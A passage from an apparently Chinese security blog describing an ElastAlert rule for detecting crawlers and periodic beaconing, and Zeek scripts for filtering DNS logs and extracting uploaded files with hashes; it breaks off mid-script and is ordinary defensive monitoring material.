<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">&quot;Detection of Spider Crawlers&quot;</span></span><br><span class="line"><span class="attr">es_host:</span> <span class="string">&quot;es_server&quot;</span></span><br><span class="line"><span class="attr">es_port:</span> <span class="number">9200</span></span><br><span class="line"><span class="attr">type:</span> <span class="string">&quot;elastalert_modules.spider.my_rules.SpiderRule&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">index:</span> <span class="string">&quot;zeek-other-%Y.%m.%d&quot;</span></span><br><span class="line"><span class="attr">use_strftime_index:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">filter:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">term:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">&quot;canon88.github.io&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">term:</span></span><br><span class="line">    <span class="attr">method.keyword:</span> <span class="string">&quot;GET&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">include:</span> [<span class="string">&quot;true_client_ip&quot;</span>, <span class="string">&quot;host&quot;</span>, <span class="string">&quot;uri&quot;</span>, <span class="string">&quot;uri_path&quot;</span>, <span class="string">&quot;user_agent&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">timestamp:</span></span><br><span class="line">  <span class="attr">format:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">timestamp_field:</span> <span class="string">&quot;@timestamp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">buffer_time:</span></span><br><span class="line">  <span class="attr">hours:</span> <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="attr">run_every:</span></span><br><span class="line">  <span class="attr">minutes:</span> <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="attr">max_query_size:</span> <span class="number">10000</span></span><br><span class="line"><span class="attr">scroll:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="attr">beacon:</span></span><br><span class="line">  <span class="attr">max_args_length:</span> <span class="number">10</span>		<span class="comment"># 最大检测参数个数</span></span><br><span class="line">  <span class="attr">min_hits:</span> <span class="number">120</span>					<span class="comment"># 最小命中事件数</span></span><br><span class="line">  <span class="attr">max_unique_args:</span> <span class="number">2</span>		<span class="comment"># 最大动态变化参数</span></span><br><span class="line">  <span class="attr">threshold_percent:</span> <span class="number">70</span>	<span class="comment"># 请求阈值百分比</span></span><br><span class="line">  <span class="attr">threads:</span> <span class="number">16</span>						<span class="comment"># 多进程</span></span><br><span class="line">  <span class="attr">beacon_module:</span> <span class="literal">true</span>		<span class="comment"># 开启周期性检测</span></span><br><span class="line">  <span class="attr">min_interval:</span> <span class="number">1</span>				<span class="comment"># 最小周期</span></span><br><span class="line">  <span class="attr">window:</span> <span class="number">2</span>							<span class="comment"># 抖动窗口</span></span><br><span class="line">  <span class="attr">user_agent:</span> <span class="number">20</span>				<span class="comment"># 唯一UA个数</span></span><br><span class="line"></span><br><span class="line"><span class="attr">field:</span></span><br><span class="line">  <span class="attr">true_client_ip:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">src_ip</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">host:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">http_host</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">uri_path:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">url_path</span></span><br><span class="line">    <span class="attr">type:</span> [<span class="string">hash</span>]</span><br><span class="line">  <span class="attr">uri:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">url</span></span><br><span class="line">  <span class="attr">user_agent:</span></span><br><span class="line">    <span class="attr">alias:</span> <span class="string">user_agent</span></span><br><span class="line"></span><br><span class="line"><span class="attr">output:</span></span><br><span class="line">  <span class="attr">json:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">yes</span>	<span class="comment"># 本地输出</span></span><br><span class="line">    <span class="attr">path:</span> <span class="string">/var/log/spider/spider_detect.json</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">no</span>	<span class="comment"># 输出至Redis，联动情报数据进行研判。</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">redis_server</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">6379</span></span><br><span class="line">    <span class="attr">db:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">redis_password</span></span><br><span class="line">    <span class="attr">key:</span> <span class="string">spider:feeds</span></span><br><span class="line">    <span class="attr">field:</span> <span class="string">src_ip</span></span><br><span class="line"></span><br><span class="line"><span class="attr">alert:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">debug</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="告警输出"><a href="#告警输出" class="headerlink" title="告警输出"></a>告警输出</h5><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;detail&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;percent&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;cookieid&quot;</span>: <span class="number">81</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;unique&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;cookieid&quot;</span>: <span class="number">133</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;tags&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;enumerate&quot;</span>, <span class="comment">// 存在参数遍历行为</span></span><br><span class="line">    <span class="string">&quot;suspicious-ua&quot;</span>	<span class="comment">// user_agent 超过阈值</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;54.160.169.250&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;url_path&quot;</span>: <span class="string">&quot;/image/cookieId.html&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;http_host&quot;</span>: <span class="string">&quot;canon88.github.io&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;unique_ua&quot;</span>: <span class="number">47</span>,</span><br><span class="line">  <span class="attr">&quot;alert&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;beacon&quot;</span>: &#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;args_list&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;cookieid&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;total_hits&quot;</span>: <span class="number">164</span>,</span><br><span class="line">  <span class="attr">&quot;url_sample&quot;</span>: <span class="string">&quot;/image/cookieId.html?cookieid=E99A3E54-5A81-2907-1372-339FFB70A464&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;period&quot;</span>: <span class="string">&quot;1:00&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-06-02T11:07:59.276581&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h5><p><strong>find_spider： <strong>用于检测参数遍历的行为，这里加上</strong>find_beacon</strong>是为了增加一个周期性的检测维度。当然很多爬虫都会「自带」时间抖动，以及使用爬虫池，所以效果并不是特别明显。</p>
<p><strong>find_beacon：</strong>更适用于检测C2连接，例如针对DNS域名的请求这种情况，这里有一个检测到的域名周期性请求的告警：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;src_ip&quot;</span>: <span class="string">&quot;x.x.x.228&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;hostname&quot;</span>: <span class="string">&quot;entitlement.service.imperva.com&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;answers&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;joxkwsf.x.incapdns.net&quot;</span>,</span><br><span class="line">        <span class="string">&quot;45.60.73.51&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;percent&quot;</span>: <span class="string">&quot;100&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;interval&quot;</span>: <span class="number">1800</span>,</span><br><span class="line">    <span class="attr">&quot;occurrences&quot;</span>: <span class="number">23</span>,</span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span>: <span class="string">&quot;2020-06-01T08:03:38.164363&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;period&quot;</span>: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;beaconing&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;num_hits&quot;</span>: <span class="number">806379</span>,</span><br><span class="line">    <span class="attr">&quot;num_matches&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">&quot;kibana_url&quot;</span>: <span class="string">&quot;https://canon88.github.io/goto/5f089bcc411426b854da71b9062fdc8c&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/%E5%91%A8%E6%9C%9F%E6%80%A7DNS%E8%AF%B7%E6%B1%82%E6%88%AA%E5%9B%BE-1.png" alt="image-20200603113849810"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>​        1小时内，IP: 54.160.169.250 总共访问了该接口164次且cookieid参数更换了133次，占到总请求量的81%。并更换了47个不同的user_agent。</p>
<p><img src="/2020/06/02/Elastalert-%E6%96%B0%E5%A2%9E%E5%91%A8%E6%9C%9F%E6%80%A7%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99/%E5%BC%82%E5%B8%B8%E8%AE%BF%E9%97%AE%E6%88%AA%E5%9B%BE-1.png" alt="image-20200602114610615"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><strong><a target="_blank" rel="noopener" href="https://github.com/austin-taylor/flare">Flare</a></strong></p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/Yelp/elastalert">ElastAlert</a></strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Canon">
      <meta itemprop="description" content="一个热爱健身的安全分析师">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Canon's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/" class="post-title-link" itemprop="url">Zeek - 高度定制化的 DNS事件 + 文件还原</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-05-11 09:39:32" itemprop="dateCreated datePublished" datetime="2020-05-11T09:39:32+08:00">2020-05-11</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-06-04 15:53:39" itemprop="dateModified" datetime="2020-06-04T15:53:39+08:00">2020-06-04</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/NIDS/" itemprop="url" rel="index"><span itemprop="name">NIDS</span></a>
        </span>
    </span>

  
      </div>
      <div class="post-meta">
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>10 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><ol>
<li><p>本地环境中部署了2台NTA（<strong>Suricata</strong>）接收内网12台DNS服务器的流量，用于发现DNS请求中存在的安全问题。近一段时间发现2台NTA服务器运行10小时左右就会自动重启<strong>Suricata</strong>进程，看了一下日志大概意思是说内存不足，需要强制重启释放内存。说起这个问题当时也是花了一些时间去定位。首先DNS这种小包在我这平均流量也就25Mbps，所以大概率不是因为网卡流量过大而导致的。继续定位，由于我们这各个应用服务器会通过内网域名的形式进行接口调用，所以DNS请求量很大。<strong>Kibana</strong>上看了一下目前<code>dns_type: query</code>事件的数据量<strong>320,000,000/天 ~ 350,000,000/天</strong>（这仅仅是<code>dns_type: query</code>数据量，<code>dns_type: answer </code>数据量<strong>也超级大</strong>）。由于<strong>Suricata</strong>不能在数据输出之前对指定域名进行过滤，这一点确实<strong>很傻</strong>，<strong>必须吐槽</strong>。当时的规避做法就是只保留<code>dns_type: query</code>事件，既保证了<strong>Suricata</strong>的正常运行也暂时满足了需求。</p>
</li>
<li><p>近一段时间网站的某个上传接口被上传了包含<strong>恶意Payload</strong>的jpg与png。虽然<strong>Suricata</strong>有检测到，但也延伸了新的需求，如何判断文件是否上传成功以及文件还原与提取<strong>HASH</strong>。虽然这两点<strong>Suricata</strong>自身都可以做，但是有一个弊端不得不说。例如<strong>Suricata</strong>只要开启<code>file_info</code>就会对所有支持文件还原的协议进行<strong>HASH</strong>提取。由于我们是电商，外部访问的数据量会很大，<strong>Suricata</strong>默认不支持过滤，针对用户访问的HTML网页这种也会被计算一个<strong>HASH</strong>，这个量就非常的<strong>恐怖</strong>了。</p>
</li>
</ol>
<p><strong>总结：</strong>针对以上2个问题，我需要的是一个更加灵活的NTA框架，下面请来本次主角 - <strong>Zeek</strong>。</p>
<hr>
<h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><ol>
<li>过滤内部DNS域名，只保留外部DNS域名的请求与响应数据；</li>
<li>更灵活的文件还原与提取HASH;</li>
</ol>
<hr>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><h5 id="1-过滤本地DNS请求"><a href="#1-过滤本地DNS请求" class="headerlink" title="1. 过滤本地DNS请求"></a>1. 过滤本地DNS请求</h5><h6 id="DNS脚本"><a href="#DNS脚本" class="headerlink" title="DNS脚本"></a>DNS脚本</h6><p><strong>dns-filter_external.zeek</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">redef Site::local_zones = &#123;<span class="string">&quot;canon88.github.io&quot;</span>, <span class="string">&quot;baidu.com&quot;</span>, <span class="string">&quot;google.com&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> dns_filter(rec: DNS::Info): bool</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="built_in">return</span> ! Site::is_local_name(rec<span class="variable">$query</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">redef Analyzer::disable_all = T</span><br><span class="line"></span><br><span class="line">event <span class="function"><span class="title">zeek_init</span></span>()</span><br><span class="line">  &#123;</span><br><span class="line">  Analyzer::enable_analyzer(Analyzer::ANALYZER_VXLAN);</span><br><span class="line">  Analyzer::enable_analyzer(Analyzer::ANALYZER_DNS);</span><br><span class="line">  Log::remove_default_filter(DNS::LOG);</span><br><span class="line">  <span class="built_in">local</span> filter: Log::Filter = [<span class="variable">$name</span>=<span class="string">&quot;dns_split&quot;</span>, <span class="variable">$path</span>=<span class="string">&quot;/data/logs/zeek/dns_remotezone&quot;</span>, <span class="variable">$pred</span>=dns_filter];</span><br><span class="line">  Log::add_filter(DNS::LOG, filter);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h6 id="脚本简述："><a href="#脚本简述：" class="headerlink" title="脚本简述："></a>脚本简述：</h6><ol>
<li><p>通过<code>Site::local_zones</code>定义一个内部的域名，这些域名默认都是我们需要过滤掉的。例如，在我的需求中，多为内网的域名；</p>
<ol start="2">
<li>优化性能， 只开启DNS流量解析。由于这2台NTA只负责解析DNS流量，为了保留针对域名特征检测的能力，我选择了<strong>Suricata</strong>与<strong>Zeek</strong>共存，当然<strong>Zeek</strong>也可以做特征检测，只是我懒。。。通过<code>Analyzer::enable_analyzer(Analyzer::ANALYZER_DNS);</code>指定了只对DNS流量进行分析；</li>
<li>过滤日志并输出；</li>
</ol>
</li>
</ol>
<h6 id="日志样例："><a href="#日志样例：" class="headerlink" title="日志样例："></a>日志样例：</h6><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;ts&quot;</span>: <span class="number">1589175829.994196</span>,</span><br><span class="line">  <span class="attr">&quot;uid&quot;</span>: <span class="string">&quot;CPRxOZ2RtkPYhjz8R9&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.orig_h&quot;</span>: <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.orig_p&quot;</span>: <span class="number">40411</span>,</span><br><span class="line">  <span class="attr">&quot;id.resp_h&quot;</span>: <span class="string">&quot;2.2.2.2&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;id.resp_p&quot;</span>: <span class="number">53</span>,</span><br><span class="line">  <span class="attr">&quot;proto&quot;</span>: <span class="string">&quot;udp&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;trans_id&quot;</span>: <span class="number">696</span>,</span><br><span class="line">  <span class="attr">&quot;rtt&quot;</span>: <span class="number">1.3113021850585938e-05</span>,</span><br><span class="line">  <span class="attr">&quot;query&quot;</span>: <span class="string">&quot;graph.facebook.com&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;qclass&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;qclass_name&quot;</span>: <span class="string">&quot;C_INTERNET&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;qtype&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">&quot;qtype_name&quot;</span>: <span class="string">&quot;A&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;rcode&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;rcode_name&quot;</span>: <span class="string">&quot;NOERROR&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;AA&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;TC&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;RD&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;RA&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;Z&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">&quot;answers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;api.facebook.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;star.c10r.facebook.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;157.240.22.19&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;TTLs&quot;</span>: [</span><br><span class="line">    <span class="number">540</span>,</span><br><span class="line">    <span class="number">770</span>,</span><br><span class="line">    <span class="number">54</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;rejected&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">&quot;event_type&quot;</span>: <span class="string">&quot;dns&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>当采用Zeek过滤了DNS请求后，现在每天的DNS数据量 <strong>6,300,000/天 ~ 6,800,000/天</strong>（query + answer），对比之前的数据量<strong>320,000,000/天 ~ 350,000,000/天</strong>（query）。数据量减少很明显，同时也减少了后端ES存储的压力。</p>
<ul>
<li>Zeek DNS （query + answer）</li>
</ul>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Zeek-DNS-1.png" alt="image-20200511135508651"></p>
<ul>
<li>Suricata DNS （query）</li>
</ul>
<p><img src="/2020/05/11/Zeek%E5%AE%9E%E6%88%98-1/Suricata-DNS-1.png" alt="image-20200511140015791"></p>
<hr>
<h5 id="2-更灵活的文件还原与提取文件HASH"><a href="#2-更灵活的文件还原与提取文件HASH" class="headerlink" title="2. 更灵活的文件还原与提取文件HASH"></a>2. 更灵活的文件还原与提取文件HASH</h5><h6 id="文件还原脚本"><a href="#文件还原脚本" class="headerlink" title="文件还原脚本"></a>文件还原脚本</h6><p><strong>file_extraction.zeek</strong> </p>
<p><strong>Demo脚本，语法并不是很优雅，切勿纠结。</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">@load base/frameworks/files/main</span><br><span class="line">@load base/protocols/http/main</span><br><span class="line"></span><br><span class="line">module Files;</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> &#123;</span><br><span class="line">    redef record Info += &#123;</span><br><span class="line">        hostname:         string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        proxied:          <span class="built_in">set</span>[string] &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        url:              string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        method:           string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        true_client_ip:   string &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">        logs:             bool &amp;<span class="built_in">log</span> &amp;optional;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    option http_info = T;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">redef FileExtract::prefix = <span class="string">&quot;/data/logs/zeek/extracted_files/&quot;</span>;</span><br><span class="line"></span><br><span class="line">global mime_to_ext: table[string] of string = &#123;</span><br><span class="line">    [<span class="string">&quot;text/plain&quot;</span>] = <span class="string">&quot;txt&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-executable&quot;</span>] = <span class="string">&quot;&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;application/x-dosexec&quot;</span>] = <span class="string">&quot;exe&quot;</span>,</span><br><span class="line">    [<span class="string">&quot;image/jpeg&quot;</span>] = <span class="string">&quot;jpg&quot;</span>,</span><br><span class="line">    [<span 